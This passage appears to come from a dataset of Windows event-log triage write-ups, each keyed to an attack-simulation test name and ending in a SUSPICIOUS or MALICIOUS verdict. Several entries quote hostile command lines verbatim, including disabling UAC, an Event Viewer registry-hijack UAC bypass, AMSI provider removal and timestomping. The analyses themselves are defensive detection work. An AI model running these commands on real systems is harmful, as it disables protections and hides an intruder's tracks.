   - Most of the commands observed have been executed with a high integrity level, suggesting they were performed with administrative privileges, increasing the risk if they are part of a malicious script.

4. **Multiple Instances of wevtutil.exe:**
   - The presence of `wevtutil.exe` processes could suggest manipulation or querying of event logs. While `wevtutil.exe` is a legitimate utility, the execution pattern here could be indicative of log tampering attempts, aiming to cover up other actions. This is especially concerning in a security context.

5. **Frequent Use of MicrosoftEdgeUpdate.exe:**
   - The logs show several `MicrosoftEdgeUpdate.exe` processes running, seemingly related to update tasks. However, the consistent triggering could suggest exploitation or misuse under certain threat landscapes, especially if the update process has known vulnerabilities.

**Assessment:**

- **Suspicious Activity Identified:** The activity observed in these logs, particularly the repeated high-integrity-level executions of `cmd.exe` and `wevtutil.exe`, along with file attribute modifications using `attrib.exe`, suggests potentially suspicious behavior. There is no concrete evidence of malicious activity such as known malware signatures or overt data exfiltration, but the patterns align with tactics used by malicious actors.

### Resolution: **SUSPICIOUS**

**Guidance on How to Proceed:**

- **Conduct Further Investigation:**
  - Analyze the origin of the commands, scripts, or scheduled tasks that initiated these processes. Check for associated user activity that might correlate with legitimate administrative tasks.
  - Cross-reference other system logs and endpoint detection logs for any matching IOCs (Indicators of Compromise).
  - Investigate recent modifications to system files and configurations, especially in directories accessed by the scripts.

- **Implement Monitoring:**
  - Enhanced monitoring on the affected systems, especially for further `cmd.exe` and `attrib.exe` usage.
  - Consider deploying more advanced detection mechanisms, such as EDR (Endpoint Detection and Response) solutions, to detect broader indicators of lateral movement or persistence mechanisms.

- **Harden System Configurations:**
  - Evaluate and restrict permissions where possible to limit high-integrity processes only to necessary operations.
  - Consider implementing stricter application control policies to prevent unauthorized use of command-line tools and utilities like `wevtutil.exe` and `attrib.exe`.

This detailed analysis reveals suspicious patterns that necessitate further investigation, but it does not definitively identify any particular malicious threats. Ensure a detailed follow-up to verify the legitimacy of these activities."
Windows HideSCAVolume Group Policy Feature,"Based on the analysis of the provided Windows event logs, the following findings have been made:

### System Log
- **Time Adjustment Events (EventID 24/1):** The logs show events related to the system time being adjusted by svchost.exe. While frequent time changes may sometimes be associated with nefarious activities like timestamp tampering, these entries appear to be regular time sync operations handled by the Windows Time Service (`time.windows.com`) and show no signs of unauthorized access.

### Sysmon Log
- **Conhost.exe and Wevtutil.exe Execution:** Multiple entries show wevtutil.exe and conhost.exe executions by the user `SERVER002\admin_test`. These do not appear abnormal by themselves; tools like wevtutil are often used for Windows Event logging purposes, and conhost.exe is used by command-line applications.
  
- **Command Line: Registry Modification (cmd.exe and reg.exe):** 
  - The logs capture a `cmd.exe` executing a registry modification, specifically hiding the SCA volume: 
    ```
    ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAVolume /t REG_DWORD /d 1 /f
    ```
  - This registry change could indicate an attempt to disable storage device visibility in the UI, which is suspicious behavior and potentially malicious.

- **Microsoft Edge Updates:** Numerous entries indicate Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`) being executed. The processes appear legitimate as they conform to Microsoft's update mechanism, showing correct file paths, versions, and hashes.

### Security Log
- **Logon and Privilege Escalation Events:** Events show successful logons for `admin_test` and privilege assignments, which include high privileges (`SeDebugPrivilege`, etc.). With no initial logon anomalies and considering these activities follow typical administrative tasks, they do not indicate malicious behavior by themselves but should be evaluated carefully as part of security policy.

### Application Log
- **Edge Update Service Stopping:** While it simply notes the service stopping, this can be part of the normal update process and doesn't indicate an issue by itself.

### Assessment
Overall, the logs present a mix of expected system behavior and flagged activities. The main point of concern is the registry modification which aligns with suspicious activity patterns, as this could be part of a strategy to hide malicious activities or prevent specific UI elements from being accessed.

### Resolution: 
**SUSPICIOUS**

### Guidance
1. **Further Investigation:** The registry modification should be reviewed for legitimacy. Verify if the action aligns with any authorized policy changes or if it could be part of a larger compromise.
   
2. **Monitoring:** Enable closer monitoring of `SERVER002\admin_test` activities and similar registry changes to detect potential further actions.

3. **Review System Access Policies:** Evaluate and ensure all access levels and configurations adhere to security policies.

4. **Incident Response:** If unauthorized, consider initiating an incident response process to limit any ongoing malicious activity.

This situation involves possibly suspicious activity, potentially requiring follow-up to protect against possible threats."
Disable UAC using reg.exe,"Upon analyzing the provided logs, several observations stand out:

1. **Registry Modification**:
   - A critical event is the execution of a process (`cmd.exe`) with a command line argument that modifies the Windows registry to change the User Access Control (UAC) settings:
     ```
     ""cmd.exe"" /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
     ```
   - This command disables UAC, which is typically used to control system permissions and protect against unauthorized executions. The action was executed under the `admin_test` user with high integrity level, indicating a privileged account performing potentially malicious configuration changes.

2. **Multiple Processes Involving Edge Update**:
   - There are numerous instances of processes related to `MicrosoftEdgeUpdate.exe` executing with various command line arguments. These include `/svc`, `/update`, `/c`, and others, all run under `NT AUTHORITY\SYSTEM`. 
   - While frequent updates from software components like Microsoft Edge are normal, the sheer volume and proximity in time suggest that these executions may be masking other activity or could be leveraged for malicious purposes.

3. **Time Synchronization Events**:
   - There are events related to time adjustments on the system, executed by `svchost.exe` under the `LOCAL SERVICE` account. While frequent time adjustments can sometimes suggest malicious activity aimed at altering logs for cover-up, in this case, they appear system-related and lack further context to conclude malicious intent.

4. **Execution of Common Diagnostic Utilities**:
   - Executions of `hostname.exe`, `whoami.exe`, and `wevtutil.exe` are noted, typically benign diagnostic commands. Their presence might be indicative of a user or script gathering system information. If associated with unauthorized access, these could be reconnaissance activities.

### Assessment

- **MALICIOUS**: The registry modification to disable UAC is a significant red flag. This action indicates a potential security breach or compromise, as it undermines the system's inherent security measures designed to prevent unauthorized changes and privilege escalation.
  
### Guidance

- **Immediate Mitigation**: Reinstate the registry setting for UAC to its default value to restore security. Remove any unauthorized accounts or sessions that might still be active.
- **Incident Investigation**: Conduct a full security audit on `SERVER002`. Evaluate how the `admin_test` account was utilized and by whom, ensuring password credentials were not compromised.
- **Continuous Monitoring**: Enhance monitoring for any further registry changes or command executions indicative of unauthorized behavior.

The presence of a high-integrity level execution that alters critical security settings (UAC) without proper documentation or justification is sufficient to classify these activities as malicious, requiring immediate investigation and response."
UACME Bypass Method 61,"## Detailed Analysis:

### **Application Logs:**

1. **Windows Defender Status**
   - Multiple entries indicate that Windows Defender is **ON**. This suggests that the antivirus tool is operational, which is normally a good indication but not directly related to malicious activity.

### **Sysmon Logs:**

1. **Suspicious Command Prompt and PowerShell Usage**
   - **EventID 1** indicates the launch of `cmd.exe` with a command to echo a suspicious file path related to `Akagi64.exe`, which might be linked to a known exploit or attack tool.
   - The command was executed from an elevated privilege level (IntegrityLevel ""High""), by user `admin_test`. This process was spawned by `powershell.exe`, which is often exploited for script-based attacks.

2. **Wevtutil and Conhost Processes**
   - Repeated execution of `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` can be used to clear event logs, which is suspicious if not related to any administrative task.
   - The rapid and repeated invocations indicate possible obfuscation or log tampering.

3. **Network Service User for `sppsvc.exe` Execution**
   - Execution of `sppsvc.exe` by the `NT AUTHORITY\NETWORK SERVICE` user. While `sppsvc.exe` is a legitimate process related to software protection, its execution context needs verification to rule out abuse.

4. **Usage of `whoami.exe` and `hostname.exe`**
   - This could imply reconnaissance activity, where information about user accounts and machine identity is being gathered.

### **Security Logs:**

1. **Successful Login and Elevated Privileges**
   - Multiple **EventID 4624 (Logon)** with logon type 5, indicating service-related logons, which are typically normal.
   - **EventID 4672** reflects assignment of special privileges, like Debug, System Environment, and Impersonate Privileges. This needs to be verified for intended administrative actions.

2. **EventID 5379 and Credential Access**
   - Multiple entries reflecting credential access issues, which could indicate attempts to access credentials stored locally.

### **Overall Assessment:**

The logs reflect recurring patterns of command execution, possible reconnaissance, potential credential harvesting attempts, and a suspicious file reference, all of which align with potential malicious activity orchestrated through elevated privileges. The use of system tools for logging and reconnaissance tasks, especially with elevated privileges, reinforces the suspicion. These patterns indicate a need for in-depth forensic examination to rule out malicious usage.

### **Resolution:**

**SUSPICIOUS** - The logs contain activities suggesting potentially malicious intent or behavior that warrants further investigation.

### **Guidance on How to Proceed:**

1. **Immediate Action:**
   - Isolate the host to prevent potential lateral movement.
   - Conduct a detailed analysis of the processes started by `admin_test`, especially focusing on PowerShell scripts and any accessed files, like `Akagi64.exe`.

2. **Further Investigation:**
   - Verify the integrity and purpose of the referenced `Akagi64.exe`.
   - Investigate how the network service account was used with `sppsvc.exe` and its command history.
   - Examine the purpose and logs related to repeated uses of `wevtutil.exe`.

3. **Remediation:**
   - Patch any vulnerabilities or misconfigurations allowing unauthorized or unintended escalation of privileges.
   - Review security policies, especially around script execution and privileged commands.
   - Consider additional security measures like enhanced logging, multi-factor authentication, or hardening of PowerShell execution policies.

4. **Continuous Monitoring:**
   - Increase monitoring on the affected and related systems for continued suspicious activities."
Execute base64-encoded PowerShell from Windows Registry,"### Detailed Analysis of Logs:

**1. Windows PowerShell Log:**

- **Base64 Encoding and Decoding:** The logs show that a PowerShell script is being executed where it encodes a command using Base64 and stores it in the Windows registry under `HKCU:\Software\Microsoft\Windows\CurrentVersion` with the name Debug. The script then retrieves the Base64 encoded string from the registry and executes it using `IEX` (Invoke-Expression), which is highly used in malicious activities to obfuscate commands.
  
- **Suspicious Command Execution:** The use of Base64 encoding to execute a PowerShell command and especially leveraging `IEX` is a red flag for potentially malicious activity, as this is a technique often used in fileless malware or by attackers to hide the intent of their scripts.

**2. Application Log:**

- **Windows Defender Status:** Windows Defender is running and reports its status as on. There are no events indicating any threats were detected during this period. However, just because it reports as being on doesn't mean it actively detected the current threat.

**3. Sysmon Log:**

- **No Red Flags in Standard Processes:** The execution of processes like `whoami.exe`, `conhost.exe`, and `SecurityHealthService.exe` appears normal for Windows operations. However, the invocation of PowerShell as captured in EventRecordID `17947` follows the Base64 decoding observed in the PowerShell logs, aligning with suspicious behavior.

- **Process Execution:** The PowerShell process `powershell.exe` and its command line matches the encoded instructions found in the registry, confirming the execution of potentially malicious code.

**4. System Log:**
  
- **General System Activity:** The system log records typical system maintenance activities like hive size adjustments and updates, which appear benign.

- **Windows Update:** Successful updates for Microsoft Defender Antivirus indicate regular system maintenance.

**5. Security Log:**

- **Elevated Privileges:** An event (ID 4672) shows the SYSTEM account gaining several high privileges such as `SeDebugPrivilege`, which can be used to tamper with system security processes. This is normal for SYSTEM processes but could also imply a privilege escalation if misused.

### Assessment:

Based on the analysis:

- **Suspicious Activity Observed:** The PowerShell logs contain activity where commands are obfuscated using Base64 encoding and executed via `Invoke-Expression`, often indicative of malicious attempts to run hidden scripts. This behavior matches patterns found in malicious scripts attempting to evade detection and execute unauthorized code.

- **Other Logs:** While the presence of Windows Defender is positive, it hasn't flagged the activities as suspicious, indicating potential blind spots in threat detection. The Sysmon logs show actual executions of PowerShell commands, corroborating the suspicious activity.

### Final Resolution:

**SUSPICIOUS** - The logs contain suspicious activities that are consistent with common tactics used in malware infections and unauthorized administrative control, specifically the obfuscated PowerShell command execution. Further investigation is warranted to check for potential breaches, review network activity, and ensure that no hidden processes or system changes have compromised the system.

### Guidance:

1. **Immediate Actions:**
   - Isolate the system (Server002) to prevent lateral movement or further external command and control interactions.
   - Conduct a full malware and rootkit scan on the system with updated signatures.
   - Perform a manual review of the registry changes and any other encoded commands.

2. **Further Investigation:**
   - Check for any unauthorized user accounts or changes to user group memberships.
   - Review any networks or logs of file and system access for unusual patterns around the time of these logs.
   - Ensure PowerShell logging and script-block logging are enabled for better future auditing.

3. **Remediation:**
   - Update all system software and security tools to the latest versions to cover any potential vulnerabilities.
   - Establish stricter monitoring policies for PowerShell use and unforeseen changes in the registry.
   - Educate the system users and administrators on recognizing and reporting suspicious activities."
Bypass UAC using Event Viewer (PowerShell),"Upon analyzing the provided Windows logs, several indicators of potentially suspicious activity can be observed. Here is a detailed analysis:

1. **Sysmon logs:**
   - Multiple events show execution of common Windows utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) by the user `SERVER002\admin_test` with high integrity levels, which can indicate privilege escalation activities or lateral movement attempts.
   - The execution of PowerShell with a command that modifies the registry to change the default handler for `mscfile` and then runs `eventvwr.msc` is a known technique (often referred to as ""eventvwr bypass"") used to execute commands with elevated privileges:
     ```
     powershell.exe & {New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force; Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; Start-Process ""C:\Windows\System32\eventvwr.msc""}
     ```
   - This technique is further confirmed in the Windows PowerShell log which shows the same PowerShell command execution.

2. **Security logs:**
   - There are several logon and privilege escalation events for the user `admin_test` using NTLM authentication (`EventID: 4624` and `4672`). The privileges listed (e.g., `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) suggest high-level access which might have been abused.

3. **Application, System, and Windows PowerShell Logs:**
   - Consistent with the Sysmon logs, the PowerShell script reflects the suspicious behavior related to registry modifications and executing commands through event viewer.

The collected evidence indicates the presence of a common and often utilized technique in cyber attacks involving PowerShell to escalate privileges using event viewer redirect through registry modifications. Such actions clearly suggest efforts to bypass security controls and execute unauthorized privileged operations.

**Conclusion:**

The activities observed in the logs, particularly the use of PowerShell with registry manipulation aimed at privilege escalation, are classic indicators of malicious behavior. Hence, there is a strong indication of a potential compromise.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- Immediately isolate the affected machine to prevent further compromise.
- Conduct a thorough investigation to identify the origin and impact of the malicious activity.
- Review user accounts and privileges to ensure they are in line with the principle of least privilege.
- Suggest implementing additional monitoring on PowerShell usage and registry access, along with tightening security configurations.
- Consider a full incident response to determine if this activity is part of a larger threat campaign."
Mshta used to Execute PowerShell,"### Detailed Analysis of Windows Event Logs

Upon review of the provided Sysmon, System, Application, Windows PowerShell, and Security logs from Server002, the following observations and assessments are made regarding potential indicators of malicious activity:

#### Observations:

1. **Process Execution Patterns:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are initiated by the `SERVER002\admin_test` user. These processes are standard Windows components (`wevtutil.exe` manages Windows event logs, `conhost.exe` manages console windows), but their repeated execution in quick succession can be unusual.
   - Processes `hostname.exe` and `whoami.exe` are executed by the same user, which are benign as they are used for querying the system's hostname and user context respectively.

2. **Suspicious Command-Line Execution:**
   - There’s a command-line execution involving `cmd.exe` with an embedded `mshta.exe` script designed to execute `powershell.exe` with the `-nop` (no profile) and `-Command` parameters. This pattern is often associated with script-based malware or lateral movement tactics (`mshta.exe` is used to run HTML applications and can be leveraged to execute scripts).

3. **PowerShell Activity:**
   - The logs highlight PowerShell being executed with `-nop` and `-Command` arguments to output ""Hello, MSHTA!"" followed by a sleep command. Although these precise commands do not appear directly harmful, this method is a known tactic to execute scripts without leaving traces in profile data and can be indicative of reconnaissance or preparation for further malicious actions.

4. **System and Security Logs:**
   - The system and security logs primarily reflect normal operations, with the relevant entries showing time adjustments by the `svchost.exe` process. 
   
5. **User Context and Integrity Level:**
   - The user `SERVER002\admin_test` initiated most activities, running with high integrity levels, which could imply administrative privileges.

#### Assessment:

- **Benign Indicators:**
  - Regular `whoami.exe`, `hostname.exe`, and legitimate service-related process executions (`svchost.exe`, etc.) reflect standard, benign system activities.

- **Suspicious Indicators:**
  - The utilization of `mshta.exe` to execute a PowerShell script, especially with the specific `-nop` parameter, is highly suspicious. Although the script executed (`Write-Host ""Hello, MSHTA!""; Start-Sleep`) seems harmless, the method of execution matches known patterns associated with attack frameworks or manual malicious actor operations.

#### Conclusion:

Given the presence of potentially suspicious activity involving script execution via `mshta.exe` and `powershell.exe`, which aligns with common attack vectors, further verification and investigation are warranted. This activity could represent a reconnaissance phase, an attempt to maintain persistence, or preparation for a larger attack.

#### Recommended Resolution:

**Resolution:** **SUSPICIOUS**

**Guidance:**
- Conduct a more in-depth investigation to understand the context and any modifications or anomalies in system behavior correlated with these logs.
- Review historical actions by the `SERVER002\admin_test` account to determine if this pattern of behavior is routine for this user or if it signals a change that could correlate with potential threat activity.
- Consider employing threat hunting techniques to search for potential anomalies linked to this PowerShell and scripting activity.
- Ensure endpoint protection and detect any additional indicators of compromise that coincide with the reviewed event time frame.

By investigating these suspicious activities further, we can better determine whether this is part of a legitimate administrative task, a benign operation anomaly, or indicative of malicious intent."
Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,"### Analysis of Logs:

1. **Windows PowerShell Activity**:
   - The logs indicate multiple PowerShell executions on `SERVER002` by the user `admin_test` with a high integrity level.
   - Notably, there is a PowerShell command involving `""Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe""`. This appears to be attempting to execute a script through `mshta.exe`, which is a known technique used by attackers to execute malicious scripts.

2. **Process Activity**:
   - Several instances of `powershell.exe`, `wevtutil.exe`, and `conhost.exe` are executed closely together. While `conhost.exe` spawning with these is typical, its frequency and correlation with `powershell.exe` should be examined further.
   - The use of `wevtutil.exe`, generally legitimate for querying event logs, should also be scrutinized if there's an indication it’s being used to clear or manipulate logs.

3. **Unusual Command Line Execution**:
   - The command line invocation related to `WinDir+\inf\ *.inf` using PowerShell especially with `ExecutionPolicy Restricted` raises concerns. This could be probing for certain installation scripts, which might be intended for discovering vulnerabilities or information for exploitation.

4. **Software Protection and Update Logs**:
   - Regular update events and a lone SPP event do not immediately suggest malicious activity. However, their presence alongside unusual process executions should be considered holistically.

### Assessment:
- The presence of a PowerShell command that invokes HTML applications, combined with the simulation of lateral movement, and the manipulation through `mshta.exe`, are strong indicators of potentially malicious activity.
- The PowerShell command structure suggests an attempt at persistence or lateral movement through potentially deploying or interacting with a malicious script.

### Threats and Risks:
- Potential unauthorized access or lateral movement within the network.
- Possible persistence mechanisms being introduced or maintained.
- Risk of data exfiltration or system compromise if the malicious script execution succeeds.

### Guidance for Further Action:
- Immediate investigation into the purpose and origin of the PowerShell script and the `Test.hta` file.
- Inspection of network logs and any lateral movement activity originating from `SERVER002`.
- Consider isolating the affected system to prevent further propagation if malicious activity is confirmed.
- Conduct a thorough security assessment on the account `admin_test` to validate legitimacy and rule out credential compromise.

### Resolution:
- **MALICIOUS**: The log activity, specifically the PowerShell command execution, strongly indicates potential malicious activity. It demands immediate attention and further investigation to clarify and mitigate any risks posed."
Compiled HTML Help Local Payload,"Upon reviewing the logs provided, a number of elements indicating potentially suspicious activities were analyzed:

1. **Security Log Analysis:**
   - Event ID 4624 indicates a successful logon. Logon Type 3 (Network) is generally normal but should be investigated if the logon occurs from an unusual location or is unexpected.
   - Event ID 4672 capturing the granting of special privileges to an account `admin_test` which includes high-level privileges such as `SeDebugPrivilege`, often associated with privilege escalation or tasks requiring system-level rights.

2. **Sysmon Log Analysis:**
   - There were several Sysmon events related to `admin_test` executing a variety of processes, including `powershell.exe`, `cmd.exe`, and `wevtutil.exe`. These can be normal administrative tools but are often utilized in a sequence for exploitation activities.
   - Notably, `cmd.exe` running `hh.exe` to open a `.chm` file (compiled HTML Help file), possibly indicating an attempt to execute code within the CHM file – a known vector for malware delivery or execution on compromised machines.
   - Frequent invocation of administrative or critical system executables (`svchost.exe`, `taskhostw.exe`, `wbem\\WmiPrvSE.exe`) also needs examination as they could indicate normal system operation, or in a lateral movement scenario, be related to living-off-the-land attacks where native binaries are used for malicious purposes.

3. **Application Log Analysis:**
   - Several entries related to `EdgeUpdate` might suggest regular browser update activity, but the frequency and variety of different executable invocations warrant checking against expected activity and update schedules. A broad look at `EdgeUpdate` logs often aligns with browser updates or maintenance. However, if seen in the context of other activities, it might require a closer look.

**Assessment and Next Steps:**

- **Risks Identified:**
  - Presence of several high privilege actions by `admin_test`, potential privilege escalation.
  - Unusual execution pattern of system binaries and unexpected process executions (viewing CHM files).
  - Need to confirm whether the activity aligns with expected behavior of updates and logons in the environment.

- **Resolution:**
  - **SUSPICIOUS** - The activities registered do not immediately confirm definitive malicious actions but indicate potential compromise or misuse. Further investigation is required, such as:
    - Interviewing involved users or administrators (e.g., `admin_test`) for legitimate activity.
    - Verifying update logs and approval paths for `Edge`. Look into the automation or manual update processes.
    - Correlating timestamps with known user activity schedules, location checks, and authentication logs for unexpected access patterns.
    - Assessing network traffic logs for potential data exfiltration or command-and-control communications.

Based on detailed follow-ups, the investigation can be pivoted towards identifying additional threats or confirming these as within the bounds of legitimate enterprise updates and operations."
Windows - Modify file creation timestamp with PowerShell,"Upon reviewing the provided Windows event logs, several points of interest indicate potentially suspicious activity:

1. **PowerShell Execution**: 
   - Multiple instances of PowerShell are executed by the `SERVER002\\admin_test` user.
   - Of particular concern is the command that modifies the creation time of a file: `""powershell.exe"" & {Get-ChildItem ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.006_timestomp.txt"" | %% { $_.CreationTime = ""01/01/1970 00:00:00"" }}`. This practice, known as timestomping, is often used by malicious actors to hide the true creation time of files, making it harder to track their activities during forensic investigations.

2. **Frequent Use of `conhost.exe` and `wevtutil.exe`**:
   - The logs indicate repeated and rapid execution of `conhost.exe` and `wevtutil.exe` by the same user. While these processes are legitimate, their rapid and repeated use could suggest attempts to manage or view event logs programmatically, which could be suspicious if it’s not tied to regular administrative operations.

3. **Logon and Integrity Level**:
   - The actions were performed by a user with a high integrity level, indicating privileged access. Privileged execution of PowerShell scripts that modify file properties may suggest unauthorized or potentially harmful activities.

4. **Microsoft Edge Update**:
   - Numerous entries related to Microsoft Edge updates can be seen. These activities, by themselves, appear legitimate and typical given the `NT AUTHORITY\SYSTEM` user execution. However, their mention is frequent and they could serve as a potential cover for malicious updates or processes if compromised.

5. **Time Changed Event**: 
   - There is a system time change event logged (Event ID 4616). The system time being changed could be benign, but it could also indicate attempts to manipulate time for log evasion or other malicious purposes.

**Assessment**:
- There are definite signs of activities that are not typical for a benign system environment, predominantly the use of PowerShell to modify timestamps of files, which is characteristic of covert actions to mask file activities.

**Resolution**:
- **SUSPICIOUS**: The logs exhibit activities that warrant further investigation, especially the modification of file timestamps using PowerShell and the potential manipulation of Windows event logs.

**Guidance**:
- Investigate the source and intent of the PowerShell commands executed by `SERVER002\\admin_test`, particularly the purpose of the timestamp modification.
- Assess the necessity and legitimacy of the `wevtutil.exe` and `conhost.exe` processes executed in rapid succession.
- Conduct a thorough review of user activities and permissions associated with the `SERVER002\\admin_test` account.
- Monitor system and network activity for further anomalies, corroborating with other logs or security tools to identify potentially correlated malicious behavior."
Odbcconf.exe - Load Response File,"Upon reviewing the provided logs, here is a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Execution of Setup.exe and CMD.exe:**
   - The execution of `cmd.exe` to change directory and execute `odbcconf.exe` with specified options suggests script or automated task execution. The purpose of configuring ODBC drivers in such a manner needs scrutiny, especially from a path like `Temp`, which is unusual for legitimate installations (Sysmon Event ID: 18016).

2. **Repeating Patterns of Edge Installer Activities:**
   - Multiple instances of Microsoft Edge update and installer processes have been logged. While these may seem normal due to updates, the frequency and the use of different directories (`Install` directory usage) merit further analysis to rule out any suspicious installations or exploit activity leveraging legitimate software as a facade (Sysmon Event IDs like 18025, 18026, etc.).

3. **Privilege Assignment and Elevated Token:**
   - `EventID 4672` indicates special privileges being assigned to `NT AUTHORITY\SYSTEM` and `admin_test` users. This alone isn't malicious, but it's relevant when correlated with other suspicious activities involving admin privileges or attempts to modify security policies.

4. **Log Exporting:**
   - The execution of `wevtutil.exe` to export logs (Sysmon Event ID: 18062) is notable. Log exporting is often conducted for analysis, but if done by a potentially compromised account, it may indicate log tampering or exfiltration attempts.

### Assessment:
- The security logs and system logs don't exhibit definitive signs of compromise by themselves.
- The PowerShell logs being empty might indicate they were cleared intentionally or simply not active during this period, which should generally not happen if active management scripts run frequently.

### Threats or Risks:
- **Potential Unauthorized Access by `admin_test`:** This user is repeatedly seen executing various processes including those modifying configurations (`odbcconf.exe`) and exporting logs, which requires examination.
- **High Privileges and Critical Commands Being Issued from User Profiles:**
   - Processes like `cmd.exe`, `odbcconf.exe`, and usage of `setup.exe` for installations at short intervals or unusual times could indicate attempts on privilege escalation or lateral movement within the network.

### Guidance on How to Proceed:
1. **Verification of 'admin_test' User Activity:** 
   - Confirm all activities conducted under this user were authorized, and trace back their source IP if available.
   - Review account credentials and change passwords if unauthorized access is determined.

2. **Review System Changes:**
   - Confirm all ODBC and Edge configurations were planned, check their source, and ensure no unauthorized configurations stand.

3. **Investigate Log Management Actions:**
   - Verify the reason and source behind the `wevtutil` log exportation and ensure log integrity hasn't been compromised.

4. **Monitoring and Further Investigation:**
   - Increase monitoring for accounts, applications, and network activity connected to the involved machine.
   - An in-depth investigation should continue to gather more contextual evidence from correlated logs or alerts, focusing especially on the `admin_test` user.

### Resolution:

Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value,"Based on the provided Sysmon logs for the Windows host identified as ""Server002,"" several activities stand out that warrant closer examination for potential indicators of malicious activity. Below is a detailed analysis of the provided logs:

### Analysis of Log Entries:

1. **Edge Update Activities:**
   - Multiple instances of Microsoft Edge Update processes like `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` are executing with various command-line arguments that are typically associated with legitimate software updates.
   - Processes are executed under `NT AUTHORITY\SYSTEM`, which is common for system-level updates and the integrity level is set to ""System"".
   - Numerous Edge Update-related executables are appearing in temporary directories, which may initially raise a red flag but is generally how background updates occur.

2. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - Several processes of `wevtutil.exe` and `conhost.exe` are being executed by the user `SERVER002\admin_test`. `wevtutil.exe` is used to manage event logs and its frequent invocation can indicate log tampering.
   - Moreover, the close succession of their executions might be an attempt to read or clear specific logs, which could be suspicious activity if not part of normal maintenance.

3. **Command-Line Execution Involving Registry Modification:**
   - An entry shows the execution of `cmd.exe` with a command to modify the registry key `HKLM\SOFTWARE\Policies\Microsoft\FIDO` using `reg.exe`. The command was:
     ```shell
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f
     ```
   - This kind of modification prohibits external device sign-on, and such a change should typically not occur frequently and raises questions about its necessity, especially amidst other suspicious activities.

4. **Use of `whoami.exe` and `hostname.exe`:**
   - The execution of `whoami.exe` and `hostname.exe` indicates enumeration activities. While they are legitimate tools for user and computer information gathering, their use amid other questionable activities can suggest probing or reconnaissance within the environment.

5. **Log Entries from Event Logs:**
   - The application logs showing the `service stopped` messages for Edge Update Services might coincide with update completions, which could be benign.
   - A Security SPP (Software Protection Platform) entry is noted, but nothing inherently malicious is indicated from the event.

### Conclusion:

The presence of frequent registry modifications, event log management commands, and system information enumeration alongside repetitive Edge Update activities executed by the `admin_test` account raises significant red flags for potentially malicious behavior, such as unauthorized changes or attempts to cover tracks.

### Threat Assessment and Recommendation:

- **Resolution: SUSPICIOUS**: The activities logged could be indicative of suspicious behavior, requiring further investigation. While there isn't a 100% confirmation of malicious activity, the signs suggest the potential for unauthorized access or misuse.

### Actions to Further Investigate:
- Verify if the `admin_test` user was authorized to execute these processes.
- Check if registry alterations align with change management records.
- Investigate whether the Edge update operations encountered any anomalies.
- Cross-reference command executions with known planned tasks or maintenance windows.

Taking the next steps to confirm user intentions, correlating with authorized activities, and verifying system integrity is imperative to determine if further escalation is needed."

AMSI Bypass - Remove AMSI Provider Reg Key,"Upon reviewing the provided logs from the Windows machine, several points warrant attention for potential indicators of malicious activity:

1. **Time Manipulation Events (Security and System Logs):**
   - Multiple events show a discrepancy in system time adjustments, as reflected in Event IDs 4616 (Security log) and Event ID 1 (System log). Changes in system time can cover the tracks of malicious actions or synchronize attack activities. However, given the repeated nature and apparent pattern, it might be a routine adjustment by a legitimate service.
   
2. **PowerShell Activity with Suspicious Command (Sysmon and PowerShell Logs):**
   - Several logs depict PowerShell command execution involving the `Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers...""` command. Removing keys under the AMSI (Antimalware Scan Interface) Providers could be an attempt to disable security features, a known technique in evading detection as described in many attack scenarios.

3. **Execution of System Utilities (Sysmon Logs):**
   - The logs show usage of utilities such as `wevtutil.exe`, and `hostname.exe`, `whoami.exe`, as part of normal administrative activities but can be used in a living-off-the-land (LOLBins) scenario by malware for malicious purposes.

4. **Frequent Microsoft Edge Update Events (Sysmon Logs):**
   - There is a significant amount of Microsoft Edge Update events occurring in quick succession. This might be part of routine update checks, but the frequency, combined with other suspicious items, should not be ignored entirely without further checks on the legitimacy and scheduled timing of these updates.

Actions against AMSI are known tactics used in fileless malware attacks to bypass security mechanisms. This activity deviates from typical user or system behaviors in secure environments.

Considering the highlighted points, the resolution should be **SUSPICIOUS**. This indicates that further investigation is needed to determine the legitimacy of the actions, especially focusing on the PowerShell scripts and registry changes. Actions include verifying if these changes were authorized or part of legitimate system administration activities, ensuring system time changes are justified, and investigating deeper into the context in which these PowerShell commands were executed."
Adding custom paths for application execution,"Upon review of the provided Windows event logs, the following activities were noted:

1. **Sysmon Log Analysis:**
   - The logs show multiple processes (such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `reg.exe`) executing as the user `SERVER002\admin_test`.
   - Particularly suspicious are the command line executions observed:
     - **`cmd.exe` executing a command to alter the Windows registry to change the app path for `msedge.exe` to point to `notepad.exe`**:
       ```
       ""cmd.exe"" /c reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"" /t REG_SZ /d C:\Windows\System32\notepad.exe /f
       ```
     - **`reg.exe` execution indicating a registry modification**:
       ```
